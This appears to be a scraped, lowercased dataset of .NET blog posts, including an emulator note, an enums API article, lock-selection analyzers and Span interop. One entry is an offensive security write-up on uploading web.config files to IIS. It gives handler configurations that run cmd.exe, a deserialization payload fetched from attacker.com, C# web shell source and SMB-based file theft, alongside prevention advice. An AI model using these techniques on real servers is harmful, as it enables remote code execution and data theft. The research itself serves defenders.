work probably due implemented hardware incorrect implemented one mainly cdrom timmings get console tty bios output uncomment biosverbose tty function cpu main loop also dissasemble mips cpu instruction printregs current opcode rtps rtpt geometry transformation engine coprocessor command give wrong value test moment use common division original psx us fastest le accurate division mechanism based unsigned newtonraphson unr algorithm interested emulating hardware time started java c intel cpu used classic arcade space invader later nintendo gameboy wanted keep forward ended psx good library game mainly used martin korth psxspx documentation playstation hardware http problemkaputtdepsxspxhtm also people playstation channel emudev discord http discordggdkmjaes helpful winforms easiest way output fast prototyped somehow lasted intended idea let go away future looked alternative said im focused moment core aspect much ui winforms dependency thin easily changed point used gdi even sdl seems like net cross platform ui maybe need look onto meanwhile gon na create branch opentoolkit work sound start project guy boring job unrelated coding didnt want rest life started studying try change career eventually learned bit started code whatever made happy eventually got job android dev
122,Lobsters,dotnet,"C#, F#, .NET programming",Enums & APIs,https://dev.to/timothymcgrath/enums-apis-15n4,enums apis,beer api define enum pro con define string pro con enum filter unknown value resource solution conclusion,enums doubleedged sword extremely useful create set possible value versioning problem ever add value enum perfect world enum represents closed set value versioning never problem never add value enum however live real nonperfect world seemed like closed set value often turn open let dive beer api example api beer api get return beer post accepts beer httpget public actionresult modelsbeer getbeer return new actionresult modelsbeer new modelsbeer name hop drop pourtype beercommonpourtypedraft httppost public actionresult postbeer modelsbeer beer return ok beer class public class beer public string name get set public pourtype pourtype get set pourtype enum public enum pourtype draft bottle api also convert enums string instead integer recommend best practice servicesaddmvc setcompatibilityversion addjsonoptions option optionsserializersettingsconvertersadd new newtonsoftjsonconvertersstringenumconverter big question come definition pourtype beer class public pourtype pourtype get set insted public string pourtype get set going investigate question considering happens add new value pourtype let look proscons define enum pro define pourtype enum beer create discoverability validation default add swagger defines possible value pourtype part api even better generate client code swagger defines enum clientside easily send correct value con backwards compatibility issue add pourtype created new value client know client request beer return beer pourtype error deserialization define string pro allows new value backwards compatible client far deserialization go work great case client nt actually care value client never us enum however api perspective idea true could easily cause runtime error anyway client attempt convert enum error client using value switch statement lead unexpected behavior possibly error con biggest issue discoverability gone client idea possible set value pas string idea string could handled documentation documentation notoriously date defining api much easier process client settled enum api describe completely possible including possible value enum value without value client idea possible value new enum considered version change api couple way handle version change filter controller could filter beer list remove beer pourtype may okay beer make sense client understand pourtype unknown value filter method work case case may still want return result enum value critical part resource case make sure enum unknown value need work controller get beer pourtype change unknown enum pourtype public enum pourtype summary represents undefined pourtype could new pourtype yet supported summary unknown draft bottle unknown listed api contract client anticipated unknown possibility handled client determine handle situation could impact could ui show specific feature unavailable could choose error important thing client already expect possibility resource solution one thing considered situation enum actually resource pourtype set value could expand way drink beer invented hooray may make sense expose list pourtype value api prevents version change pourtype add new value work well client care list value eg displaying value combobox client need write logic based value still issue new value land default case exposing enum resource also allows additional behavior added value help client logic example could add property pourtype requiresbottleopener client could make logic decision without relying bottle value requiresbottleopener property pourtype resource definition public class pourtype public string name get set public bool requiresbottleopener get set pourtype controller httpget public actionresult ienumerable pourtype getpourtypes real life store value database return new actionresult ienumerable pourtype new list pourtype new pourtype name draft new pourtype name bottle requiresbottleopener true new pourtype name however path increase complexity api client recommend every enum use resource approach clear case enum additional value time conclusion spent lot time thinking believe best path forward specific need tackled issue different way please discus comment nt believe perfect solution interesting see solution
124,Lobsters,dotnet,"C#, F#, .NET programming",Uploading web.config for Fun and Profit 2,https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-profit-2/,uploading webconfig fun profit,introduction execute command using webconfig root application directory executing webconfig aspx page running command using aspnetcoremodule using machine key using jsonappserviceaxd execute command using webconfig subfoldervirtual directory abusing compileroptions attribute creating web shell taking existing aspx file stealing internal file stealing data app taking existinguploaded net file stored x using stateapplication hanlder using discoveryrequesthandler hanlder prevention technique behind scene requirement resource compiler option exploring new handler handler limit subfolder temporary compiled file reference introduction execute command using webconfig root application directory executing webconfig aspx page running command using aspnetcoremodule using machine key using jsonappserviceaxd execute command using webconfig subfoldervirtual directory abusing compileroptions attribute c vbnet version chosen example jscriptnet important note creating web shell smb reachable taking existing aspx file email protected stealing internal file stealing data app taking existinguploaded net file stored x using stateapplication hanlder using discoveryrequesthandler hanlder prevention technique behind scene requirement resource compiler option exploring new handler http referencesourcemicrosoftcom referen ce http referencesourcemicrosoftcom reference http referencesourcemicrosoftcom reference handler limit subfolder http referencesourcemicrosoftcom temporary compiled file reference http http docsmicrosoftcomenusiisgetstartedplanningyouriisarchitectureunderstandingsitesapplicationsandvirtualdirectoriesoniis http http http wwwnccgrouptrustukourresearchuseofdeserialisationinnetframeworkmethodsandclasses http docsmicrosoftcomenusdotnetcsharplanguagereferencecompileroptionslistedalphabetically http wwwowasporgindexphpunrestrictedfileupload http githubcomnccgroupcrosssitecontenthijacking http http http,table content introduction execute command using webconfig root application directory executing webconfig aspx page running command using aspnetcoremodule using machine key using jsonappserviceaxd execute command using webconfig subfoldervirtual directory abusing compileroptions attribute creating web shell taking existing aspx file stealing internal file stealing data app taking existinguploaded net file stored x using stateapplication hanlder using discoveryrequesthandler hanlder prevention technique behind scene requirement resource compiler option exploring new handler handler limit subfolder temporary compiled file reference introduction second part uploading webconfig fun profit wrote original blog post back described method run asp classic code well performing stored x attack uploading webconfig file blog post well focusing running webconfig file covered technique come handy uploading webconfig application ii main goal execute code command server using webconfig file added technique stored x well technique described divided two major group depending whether webconfig file uploaded application root subfoldervirtual directory please see familiar virtual directory application term ii another blog post mine also helpful identify virtual directory application blackbox assessment execute command using webconfig root application directory method destructive application already us webconfig file going replaced might required setting database connection string valid assembly reference recommended use technique live website application might used webconfig file going replaced ii application inside application virtual directory might use webconfig file generally safer candidate website root directory following screenshot show example internal application anotherapp inside testwebconfig application also inside default web site many method used execute command server webconfig file within root directory application modified included four interesting example blog post follows executing webconfig aspx page similar uploading webconfig file within root directory application control use managed handler run webconfig file aspx page following webconfig file show example xml version encoding configuration systemwebserver handler accesspolicy read script write add name webconfig path webconfig verb type systemwebuipagehandlerfactory module managedpipelinehandler requireaccess script precondition integratedmode add name webconfigclassic path webconfig verb module isapimodule scriptprocessor windir requireaccess script precondition classicmode handler security requestfiltering fileextensions remove fileextension config fileextensions hiddensegments remove segment webconfig hiddensegments requestfiltering security validation validateintegratedmodeconfiguration false systemwebserver systemweb compilation defaultlanguage vb buildproviders add extension config type systemwebcompilationpagebuildprovider buildproviders compilation httphandlers add path webconfig type systemwebuipagehandlerfactory verb httphandlers systemweb configuration aspnet code come include html comment closing tag double dash responsewrite amp running asp code see opening webconfig file responsewrite responsewrite amp possible browse webconfig file run aspnet page obviously xml content also accessible web perhaps easier upload another file allowed extension config jpg txt file run aspx page running command using aspnetcoremodule also possible run command using aspnet core module shown xml version encoding configuration systemwebserver handler remove name aspnetcore add name aspnetcore path backdoorme verb module aspnetcoremodule resourcetype unspecified handler aspnetcore processpath cmdexe argument c calc systemwebserver configuration stated command would executed browsing backdoorme page need exist server powershell command used example reverse shell using machine key described machinekey element set webconfig file order abuse deserialisation feature run code command server using jsonappserviceaxd sneaky way running code server using known deserialisation issue within authentication process net framework see information case webconfig file look like xml version encoding configuration systemwebextensions scripting webservices authenticationservice enabled true requiressl false webservices scripting systemwebextensions appsettings add key aspnet uselegacyclientservicesjsonhandling value true appsettings systemweb membership defaultprovider clientauthenticationmembershipprovider provider add name clientauthenticationmembershipprovider type systemwebclientservicesprovidersclientformsauthenticationmembershipprovider systemwebextensions cultureneutral serviceuri http attackercompayload provider membership systemweb configuration following json show payload page attacker website http attackercompayload accept post request type systemwindowsdataobjectdataprovider presentationframework cultureneutral methodname start objectinstance type systemdiagnosticsprocess system cultureneutral startinfo type systemdiagnosticsprocessstartinfo system cultureneutral filename cmd argument c calc uploading webconfig file setting payload page remote server attacker send following http request run code command server post testwebconfigauthenticationjsonappserviceaxdlogin host victimcom contentlength contenttype applicationjson username foo password bar createpersistentcookie false noted profilejsonappserviceaxd rolejsonappserviceaxd might come handy well need enabled webconfig suitable method need called trigger deserialisation process execute command using webconfig subfoldervirtual directory webconfig file virtual directory limited webconfig root application folder useful section property abused execute command aspnetcoremodule machinekey buildproviders httphandlers used webconfig subfolder previous related blog post back found method run webconfig file asp file isapi module allowed used virtual directory look like xml version encoding configuration systemwebserver handler accesspolicy read script write add name webconfig path config verb module isapimodule scriptprocessor windir resourcetype unspecified requireaccess write precondition handler security requestfiltering fileextensions remove fileextension config fileextensions hiddensegments remove segment webconfig hiddensegments requestfiltering security systemwebserver configuration asp code come include html comment closing tag double dash responsewrite amp running asp code see opening webconfig file responsewrite responsewrite amp module one used php also used similarly allowed however often possible run anything net code ii application configured properly result introducing technique purpose abusing compileroptions attribute going use following webconfig file base template xml version encoding configuration systemweb httpruntime targetframework compilation tempdirectory debug true strict false explicit false batch true batchtimeout maxbatchsize maxbatchgeneratedfilesize numrecompilesbeforeapprestart defaultlanguage c targetframework urllinepragmas false assemblypostprocessortype assembly assembly expressionbuilders expressionbuilders compiler compiler language c extension c config type microsoftcsharpcsharpcodeprovider system cultureneutral warninglevel compileroptions compiler compilation systemweb systemwebserver handler add name webconfig path webconfig verb type systemwebuipagehandlerfactory resourcetype file requireaccess script precondition integratedmode handler security requestfiltering hiddensegments remove segment webconfig hiddensegments fileextensions remove fileextension config fileextensions requestfiltering security systemwebserver configuration type attribute compiler element set one following default type version change c microsoftcsharpcsharpcodeprovider system cultureneutral us cscexe command compile vbnet version chosen example microsoftvisualbasicvbcodeprovider system cultureneutral us vbcexe command compile jscriptnet microsoftjscriptjscriptcodeprovider microsoftjscript cultureneutral us jscexe command compile command generally found net folder net folder would c value compileroptions attribute webconfig template file added compiler command argument multiple argument provided using white space character option provided compiler command value compileroptions attribute treated file name compiler compile character terminate command character load another file described could find method execute command compiling c vbnet jscriptnet file could easily exploit compiling additional file perhaps remote shared drive previously uploaded static file however could find anything whilst research please let know know trick add important note noted aspnet page exist folder webconfig file uploaded stop working using example providing changing compilation process therefore one shot uploading webconfig file rewrite absolutely certain approach perhaps completely avoid live application safely uploaded empty folder creating web shell following string show compileroptions attribute used create dirty web shell binary data web directory resource kaliboxippublicwebshelltxt c appdatawwwrootmyappwebshellaspx browsing webconfig file setting binary file webshellaspx name created requested path knowledge application path server important possible reveal application path simply causing error error message within aspnet yellow screen death ysod displayed recommended create error another file rather webconfig file modify later webconfig file simply show error xml version encoding configuration systemweb customerrors mode idontexist systemweb configuration web shell also created outside webconfig file uploaded unless possible change webconfig file creating web shell remove compileroptions attribute allow normal compilation process noted code within webshelltxt embedded middle webshellaspx contains binary data clean copy webshell used first stage gaining access smb reachable target communicate via smb possible upload web shell allowed extension include resource option resource c appdatawwwrootmyappattachmentmyshellconfig c appdatawwwrootmyappwebshellaspx taking existing aspx file aspx file exists folder webconfig file uploaded possible change compilation process take knowledge application virtual directory important use technique explain using following example webconfig file uploaded c appdatawwwrootmyappattachment fileaspx also exists path accessible via following url http victimcommyappattachmentfileaspx possible use following compiler option take file kaliboxippublicwebshellcstxt c appdatawwwrootmyappattachmentwebshellcstxt content webshellcstxt file namespace asp using system systemruntimecompilerservicescompilerglobalscopeattribute public class attachmentfileaspx global systemwebuipage systemwebihttphandler private void systemwebuihtmltextwriter w systemwebuicontrol parametercontainer stringisnullorempty request cmd systemdiagnosticsprocess process new systemdiagnosticsprocess processstartinfofilename request cmd processstartinfoarguments request arg processstartinfouseshellexecute false processstartinforedirectstandardoutput true processstartinforedirectstandarderror true processstart read output error string output processstandardoutputreadtoend wwrite result br pre wwrite output else wwrite use cmdcmdexe amp argc dir example systemdiagnosticsdebuggernonusercodeattribute protected override void frameworkinitialize thissetrendermethoddelegate new systemwebuirendermethod email protected stealing internal file following string show compileroptions attribute resource c windowswinini kaliboxippublictestbin opening existing aspnet page upload folder creates testpdb testbin file shared folder includes winini file especially useful steal application webconfig file may contain sensitive data machine key lead remote code execution straight away stealing data app following string show compileroptions attribute resource kaliboxippublictesttxt bugreport errorreport none opening existing aspnet page folder creates large file shared path might contain sensitive data application underlying technology obviously file also created web server path known file downloaded remotely taking existinguploaded net file following webconfig used take existing web service file xml version encoding configuration systemweb webservices protocol add name documentation protocol wsdlhelpgenerator href kaliboxippublicwebshellaspx webservices systemweb configuration would load webshellaspx file smb share would execute opening existing asmx file folder also possible remap master ascx extension act like asmx file take well chance uploading file higher aspnet extension aspx asmx ashx svc soap also taken using technique following webconfig file show example take multiple file extension xml version encoding configuration systemweb webservices protocol add name documentation protocol wsdlhelpgenerator href kaliboxippublicwebshellaspx webservices systemweb systemwebserver handler add name path ascx verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script add name path master verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script add name path aspx verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script add name path ashx verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script add name path svc verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script add name path soap verb type systemwebscriptservicesscripthandlerfactory systemwebextensions cultureneutral resourcetype file requireaccess script handler security requestfiltering fileextensions remove fileextension ascx remove fileextension master fileextensions requestfiltering security systemwebserver configuration might difficult use technique smb blocked file extension href attribute wsdlhelpgenerator element matter stored x also possible create stored x might useful method work reason method making application vulnerable x via uploading webconfig file discussed example file allowed downloaded possible easily exploit x manipulating mimetypes following example show txt file could run html file xml version encoding configuration systemwebserver staticcontent remove fileextension txt mimemap fileextension txt mimetype texthtml staticcontent systemwebserver configuration blog post two new aspnet handler also identified used purpose using stateapplication hanlder stateapplication handler internal class within systemwebsessionstate namespace used caching supposed called directly user code abused replace response exiting file arbitrary text following webconfig file show example response webconfig replaced x payload xml version encoding configuration systemwebserver handler add name webconfig path config verb type systemwebsessionstatestateapplication systemweb cultureneutral resourcetype file requireaccess script handler security requestfiltering hiddensegments remove segment webconfig hiddensegments fileextensions remove fileextension config fileextensions requestfiltering security systemwebserver configuration create stored x cache minute maximum amount following request sent uploading webconfig file put testwebconfiguserfileswebconfig host victimcom httptimeout contentlength script alert script retrieve content http victimcomtestwebconfiguserfileswebconfig delete content delete testwebconfiguserfileswebconfig host victimcom order create multiple x payload using name additional parameter added url example webconfig using discoveryrequesthandler hanlder discoveryrequesthandler class systemwebservicesdiscovery namespace used serve xml file disco file actual use abused run javascript code xml response webconfig file uploaded testconfig file containing xml javascript code uploaded well following webconfig show example testconfig file served xml file xml version encoding configuration systemwebserver handler add name webconfig path testconfig verb type systemwebservicesdiscoverydiscoveryrequesthandler systemwebservices cultureneutral resourcetype file requireaccess script handler security requestfiltering hiddensegments remove segment webconfig hiddensegments fileextensions remove fileextension config fileextensions requestfiltering security systemwebserver configuration testconfig file xml version script xmlns http alert script noted xml file valid dynamicdiscoverydocument type used x used search current directory discover existing web service instead curious reader example valid file content dynamicdiscovery xmlns urn schemasdynamicdiscovery exclude path foobar exclude dynamicdiscovery prevention technique first line defence validate filename extension content using whitelist approach done allowing appropriate file extension check file content ensure use valid format recommendation seen owasp website another classic recommendation save file outside web directory database secure way day store uploaded file cloud amazon make sure access control check appropriate working implementation cause security issue insecure object reference idor path manipulation using appropriate http header also prevent crosssite content hijacking attack see following recommendation also make attack via uploading webconfig file harder using precompiled application make difficult script kiddy attack applicationensure write permission existing file within web application including webconfig file especially outside upload directorymonitor creation dynamic file website detect potential attack access code change file permission alter application work still use webconfig file application path root website mitigate attack happen uploading webconfig file possible ensure webconfig file virtual directory disabled used done changing allowsubdirconfig attribute within applicationhostconfig file normally located c see detail sensitive webconfig element changed webconfig file subdirectory also protected done using allowoverride attribute locking feature within webconfig file see detail following webconfig file show example used parent directory lock certain section abused research xml version encoding configuration systemwebserver handler lockitem true staticcontent lockitem true security requestfiltering lockitem true security systemwebserver systemweb httpruntime lockitem true compilation lockitem true webservices lockitem true systemweb systemservicemodel behavior lockitem true service lockitem true systemservicemodel configuration behind scene section basically cover research find capability explained although might boring part writeup think useful someone want continue research finding run code command webconfig root ii application easiest part could use documented webconfig capability previous research however exploring new method webconfig file uploaded subfolder common case required lot work requirement resource main resource research apart time aspnet framework source code visual studio sysinternals process monitor dnspy telerik justdecompile ii web server kali linux countless amount googling used kali linux mainly easy unauthenticated smb share could readwrite fromto etcsambasmbconf file finally worked smb support global workgroup workgroup server string samba server xyz netbios name somerandomubuntu security user map guest bad user dns proxy log file varlogsamba log level server min protocol client min protocol client max protocol public path tmpsmbshare writable yes guest ok yes read browsable yes create mode directory mode force user nobody compiler option abusing compiler option basically passing argument compiler cscexe vbcexe jscexe inside file passed via character although command injection come mind straight away work could run another command using two possible avenue lead command execution easier found research code execution specific file compiledfinding argument turn run code command failed find anything work analyzer option sounded promising c compiler missing cscexe file executed net exploring new handler seen blog post identifying http handler processed within webconfig file important done searching class implemented ihttphandler ihttphandlerfactory see easily browser thanks microsoft http referencesourcemicrosoftcom reference http referencesourcemicrosoftcom reference http referencesourcemicrosoftcom reference noted sometimes new handler could also derived implementation however behaviour normally quite minimal change handler limit subfolder aspnet us file extension detect type get proper type example needed web service requires new extension add buildproviders element however buildproviders element set application otherwise show following error element buildproviders defined application level protection coded within postdeserialize method compilationsectioncs net framework rather machineconfig file http referencesourcemicrosoftcom way execute command ii using extension predefined focus research use new extension likely allowed uploaded predefined list buildproviders seen main webconfig within aspnet configuration folder eg c temporary compiled file temporary compiled file normally copied temporary directory within net framework example c version temporary aspnet file appname hash hash file removed immediately easiest way monitor remove delete permission user temporary directory application used easily restored needed anymore create file able replace existing file application execute code server theory practice file using random value name need stolen using example filename analysed studied net framework creates new dll file theory possible rewrite existing dll file take existing net file anywhere application reference http http docsmicrosoftcomenusiisgetstartedplanningyouriisarchitectureunderstandingsitesapplicationsandvirtualdirectoriesoniis http http http wwwnccgrouptrustukourresearchuseofdeserialisationinnetframeworkmethodsandclasses http docsmicrosoftcomenusdotnetcsharplanguagereferencecompileroptionslistedalphabetically http wwwowasporgindexphpunrestrictedfileupload http githubcomnccgroupcrosssitecontenthijacking http http http
126,Lobsters,dotnet,"C#, F#, .NET programming",Avoid multithreading traps with Roslyn: Lock object selection,https://cezarypiatek.github.io/post/avoid-multithreading-traps-p1/,avoid multithreading trap roslyn lock object selection,avoid multithreading trap roslyn lock object selection concurrency visualizer parallel task window windbg dlk command lock publicly accessible member lock reference azureamqpnetlite lock object weak identity writing highperformance net code fxcop lock object weak identity roslynanalyzers lock nonreadonly field lock value type best practice locking summary multithreadinganalyzer smartanalyzersmultithreadinganalyzer,avoid multithreading trap roslyn lock object selection august multithreading one difficult aspect programming cause lot headache main source problem often improper usage synchronization mechanism result deadlock complete lack synchronization despite expectation infamous deadlock detected runtime thanks tool like concurrency visualizer parallel task window windbg dlk command however tool often used unexpected behavior observed would nice reduce feedback loop detect issue design time decided create series blog post present recently learned trap related multithreading c also show proposition roslyn analyzer possibly help avoid issue right stage writing code part choosing suitable object locking lock publicly accessible member using publicly accessible member locking result deadlock guarantee external code use synchronizing something else type encapsulates access resource requires synchronization synchronization also fully encapsulated reminder created roslyn rule called lock publicly accessible member verifies accessibility member used acquire lock onto lock reference particular example locking something publicly accessible acquiring lock reference also end deadlock reason even explicitly written code like lock lock current instance could acquired le common way synchronizing every invocation given method decorating methodimpl methodimploptionssynchronized cause wrapping whole method body lock reference instance method lock typeof static method convinced lock bad idea reallife example azureamqpnetlite protect codebase potentially dangerous statement created following analyzer lock reference method level synchronization lock object weak identity another common mistake related choosing synchronization object locking typeof expression avoided instance type implicitly shared across application reading writing highperformance net code learned type also string instance type inherit marshalbyrefobject avoided locking dug little deeper discovered type belong group called type weak identity complete list much longer systemstring array value type systemmarshalbyrefobject systemexecutionengineexception systemoutofmemoryexception systemstackoverflowexception systemreflectionmemberinfo systemreflectionparameterinfo systemthreadingthread fxcop rule lock object weak identity protect u issue however current implementation verify lock statement using monitorenter monitortryenter acquire lock still exposed risk deadlock planning create pr fix roslynanalyzers meantime implemented whole diagnostic separate analyzer lock object weak identity also realized type list directly inherited systemobject exception thread could possibly lead situation lock acquired reference base type point instance type marked weak identity increase confidence would wise completely ban systemexception systemruntimeconstrainedexecutioncriticalfinalizerobject base class thread candidate locking object lock nonreadonly field readonly keyword important without sure invocation monitorenter monitorexit lockobject reference overwritten situation called abandoned lock end deadlock lock acquired object originally referenced lockobject never released detect issue design time created analyzer called lock nonreadonly member lock value type explanation quite straightforward value type object header information acquired lock could stored write lock statement value object get compiler error however use monitorenter monitortryenter instead lock statement code compile also crush runtime systemthreadingsynchronizationlockexception try release lock happens pas value object monitorenter monitorexit every method get different instance boxing lock statement well monitor usage monitored lock value type instance rule best practice locking best practice avoid problem selecting suitable object lock onto create private readonly instance object type dedicated exclusively locking purpose private readonly object lockobject new object public void dosomething lock lockobject critical section summary proposition roslyn analyzer available github multithreadinganalyzer added project nuget package smartanalyzersmultithreadinganalyzer would appreciate could try let know able spot real problem codebase reported diagnostics wrong lot stuff presented leaned following resource want gain knowledge parallel programming c highly recommend reading find blog post useful think worth share idea others please nt hesitate use button
129,Lobsters,dotnet,"C#, F#, .NET programming",Using Span for high performance interop with unmanaged libraries,https://ericsink.com/entries/utf8z.html,using span high performance interop unmanaged library,using span high performance interop unmanaged library span layer unmanaged function layer pinvoke definition alternative string alternative byte alternative intptr byte layer one pinvoke fixed pattern problem span alternative zero terminator unknown alternative zero terminator unfficial alternative zero terminator included trouble direction maybe span wrong answer case like sqlitepclraw bumping guideline use sqlitepclraw horizon,span high performance interop unmanaged library much great performancerelated stuff happening net world right major character story span give u way reduce heap allocation copying span common operation like substring resulted allocation copy blog post want talk using span specific case interop unmanaged library deal zeroterminated string aka nullterminated string layer unmanaged function let talk layer bottom layer unmanaged function written c something pretend c kind function talking one return value parameter zeroterminated string thing quite common familiar example int put const char p file fopen const char path const char mode int const char path ppdb char asctime const struct tm tm zeroterminated string pointer find length something going start pointer walk memory find zero byte aware various security correctness etc problem associated zeroterminated string nonetheless many library use purpose blog post assume unmanaged function something ca nt change deal go let mention challenge arising differing encoding string net string encoded character byte perhaps c library expects string terminated zero byte using oldschool library might expecting ascii modern alternative case use net string zeroterminated string conversion conversion another form copy performance reason want keep minimum layer pinvoke definition next layer pinvoke definition allows u access c function net typical pinvoke look something like int ab int x dllimport msvcrt public static extern int ab int x definition say dynamic library named msvcrt look function named ab return type int one parameter type int course pointer zeroterminated string bit complicated int describe pointer pinvoke definition actually choice let discus tradeoff alternative string one thing could define pinvoke accept regular net string dllimport msvcrt public static extern int put string approach offer convenience accomplishes probably need layer anyway start net string convert get pointer pas c code well actually default marshaling string zeroterminated ansi encoding get would dllimport msvcrt public static extern int put marshalas string convenient perspective performance fond problem conversion done every time call function function called loop string every time foreach var item collection put item put itemtostring put n admittedlycontrived example writing collection item stdout one per line line start prefix end newline two put call sad conversion string going done every time piece work would rather outside loop done order need pinvoke definition somehow accepts alreadyconverted data alternative byte c layer string converted array byte right maybe pinvoke definition look like dllimport msvcrt public static extern int put byte compared previous idea big improvement flexibility encoding conversion separately reminds need utility function conversion one sqlitepclraw using systemtext public static byte string null return null int len var ba new byte len var wrote slength ba ba wrote return ba btw apology snake case naming various reason sqlitepclraw mostly follows naming convention sqlite admit nt friendly net folk anyway using byte parameter type pinvoke definition mean could write loop like var bafront item var baback n foreach var item collection put bafront put itemtostring put baback still problem data byte array data byte array alone ca nt slice without allocation copy putting byte pinvoke definition mean carry assumption using heap nt want assumption may always true would allocation copy make true alternative intptr byte another option make pinvoke look like dllimport msvcrt public static extern int put intptr like dllimport msvcrt unsafe public static extern int put byte two essentially equivalent personally prefer use byte think clear using byte require unsafe keyword see reason avoid calling unmanaged code inherently unsafe anyway either way version pinvoke definition taking pointer like underlying c function give u flexibility byte pinvoke longer assumes use managed memory however cost flexibility case using managed memory caller work going pas pointer managed memory unmanaged code need pin prevent garbage collector moving around pinvoke definition parameter type byte marshaling code pinunpin u pointer example loop shown intptr gotten worse var bafront item gchandle pinnedfront gchandlealloc bafront gchandletypepinned intptr ptrfront pinnedfrontaddrofpinnedobject var baback n gchandle pinnedback gchandlealloc baback gchandletypepinned intptr ptrback pinnedbackaddrofpinnedobject foreach var item collection put ptrfront put itemtostring put ptrback pinnedfrontfree pinnedbackfree nonetheless using pointer preferred form pinvoke definition simple equivalent c function nothing nothing le nt want marshaling anything want fhift problem pinning allocation encoding higher layer finish section move forward following implementation layer static class int put const char p dllimport msvcrt unsafe public static extern int put byte let talk next layer layer one pinvoke goal layer well kinda depends chose type parameter pinvoke definition back layer left pinvoke definition string marshaling probably would nt need another layer chosen pinvoke definition parameter type byte maybe would want layer take string conversion since chose byte forced situation need another layer get unsafe public api unsafe nt belong public c api may crazy crazy layer go ahead express string parameter term actual net string byte yeah maybe like put long possible instead asking thinnest useful layer abstraction put span static class public static int put readonlyspan byte unsafe fixed var p return p nice thing span brings advantage saw byte except without pesky assumption whether memory managed span represent unmanaged memory part managed array memory stack said case span represents managed memory still pin fixed block shown span support fixed pattern aka getpinnablereference span looking like best option far still problem problem span case underlying c function need string zero terminator span perfect solution problem related length property span encapsulation pointer length layer layer care pointer anything else string byte span benefit layer make difference underlying c function fact length part layer public api unused clue headed trouble troubling question shown readonlyspan byte parameter zero terminator included length suppose string hello string ascii character byte actual string data plus one byte zero terminator could pas span length layer wo nt care either still work heck could use completely wrong length like layer still end getting pointer length nt matter let look closely possibility exactly readonlyspan byte parameter mean see alternative alternative zero terminator unknown alternative spanlength contains string data may may zero terminator mention one way net spanbased apis work see readonlyspan byte parameter method parameter refers string data customary assume zero terminator inside span may one immediately span simply put world net zeroterminated string really thing yet even though interpretation common net practice case might worst possible option contract c function layer requires zero terminator c layer make sure one going pas expectation caller need allocate new buffer one extra byte copy data set zero terminator end would defeat whole point using span alternative zero terminator unfficial alternative spanlength contains string data wink wink know actually zero byte beyond end span opinion dreadful see span assume code using go beyond end contract function requires ending zero want insert check c side make sure static class public static int put readonlyspan byte look byte immediately span make sure zero terminator slength bzzzt wrong throw new exception zero terminator required unsafe fixed var p return p ca nt c rightfully wo nt let go beyond end span worse eventually somebody going pas span nt unofficial zero byte would common practice span byte compiler way prevent end memory corruption alternative zero terminator included alternative spanlength includes zero terminator way seems le bad two wo nt need extra allocation copy since know zero terminator already honest zero byte presence including length ignore enough context way kinda make sense zero byte documented required part block byte function expects length zeroterminated block memory represents hello including zero byte length seems wrong well everywhere go whenever zeroterminated string used zero byte never considered part length zero byte part string data memory marker called strlen pointer would return length include zero passed pointer length provide include zero byte length string hello another way illustrating impedance mismatch think slicing span support slice slicing nt work zeroterminated string rather slice zeroterminated string may end another string zeroterminated may end one depending whether slice includes end range slicing particularly useful operation zeroterminated string reliably return type trouble direction far mostly talking calling c function zeroterminated string parameter zeroterminated string returned c function net get pointer need look zero byte find length one two layer use span construct readonlyspan byte piece memory include zero byte length case big difference net stuff nt need want zero terminator initially zero byte important unmanaged code providing u way get length know length zero byte likely important net layer typically use fact include zero terminator case almost every piece code using span would need subtract one length check make sure last byte actually zero maybe string flowing directon zero terminator need receive value unmanaged code pas back c function requires zero terminator back needing allocation copy maybe span wrong answer case right situation seems bleak appear convincing span used zeroterminated string envision staying bitter spiteful rest career watch net kid get use span u working unmanaged library want use span really seems like possible approach bad probably least bad option alternative readonlyspan byte length includes zero terminator approach inconsistent common practice cause confusion therefore bug find wishing could somehow use approach without anybody finding turn solution settled span hidden away nobody see like span sqlitepclraw deal issue lot quite sqlite function follow pattern accepting returning zeroterminated string development release started spanifying interface kept bumping kind problem described blog post help feedback others solution ended seems quite elegant new type call public readonly ref struct span contain zero terminator byte splength represents null string splength byte must zero empty string readonly readonlyspan byte sp simply encapsulated readonlyspan byte inside another type first nt sure would possible span c ref struct value type used certain way ref struct stack basically mean parameter local ca nt heap mean also ca nt parameter local might end heap example async method span parameter async method actually get compiled state machine implemented using heap c happily let put ref struct inside another ref struct case use shameful confusing span zero terminator inside keep hidden away world making private add stuff public api expose thing valid needed first thing need constructor readonlyspan byte sp kept simple take span parameter store away member field error checking reason constructor private trusting caller make sure last byte span zero terminator nt want rando calling public api expose thing capable violating rule example static method get net string public static fromstring string null return new readonlyspan byte empty else return new need public method get span method include check zero terminator public static fromspan readonlyspan byte alength alength throw new argumentexception zero terminator required return new also need way convert pointer passed pinvoke word need implement fixed pattern fortunately pas responsibility encapsulated span public ref readonly byte getpinnablereference return ref spgetpinnablereference finally need convenient way convert net string public string splength return null unsafe fixed byte q sp return q splength note use override tostring microsoft guideline say tostring never return null want clearlydefined ability represent null span value type nullable implementation spangetpinnablereference return null empty span precise enough interacting unmanaged code empty string different null world c sometimes pointer null sometimes deal implementation layer look like static class public static int put unsafe fixed var p return p use sqlitepclraw interface use actual span case usage consistent associated expecations everywhere zeroterminated string appears parameter return value used word zeroterminated string different type lengthspecified string error using wrong one caught compile time think huge win nt always feasible get kind type safety code level adding memory allocation would kill performance case ref struct ftw horizon allow think future net programming done instead discussion progress toward new type appears underway http glad link includes word like ensuring null terminator important pinvoke scenario even agree dislike zeroterminated string need deal going away anytime soon
